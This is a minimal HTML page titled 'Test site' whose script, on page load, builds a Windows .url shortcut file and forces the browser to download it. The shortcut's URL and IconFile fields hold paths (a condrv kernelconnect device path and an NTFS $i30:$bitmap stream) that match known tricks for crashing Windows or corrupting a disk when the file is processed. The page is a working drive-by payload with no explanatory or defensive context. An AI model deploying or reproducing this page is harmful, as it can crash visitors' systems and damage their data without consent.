<html>
  <head>
    <title>
      Test site
    </title>
  </head>
  <body>
    <script>
      let file = new File(["[InternetShortcut]\n",
        "URL=\\.\globalroot\device\condrv\kernelconnect\n",
        "IconIndex=0\n",
        "IconFile=C:\:$i30:$bitmap\n"],
         "file.url", {
        type: "text/plain",
        }
      );

      let link = document.createElement('a');
      link.download = file.name;

      link.href = URL.createObjectURL(file);
      link.click();
      URL.revokeObjectURL(link.href);
    </script>
  </body>
</html>
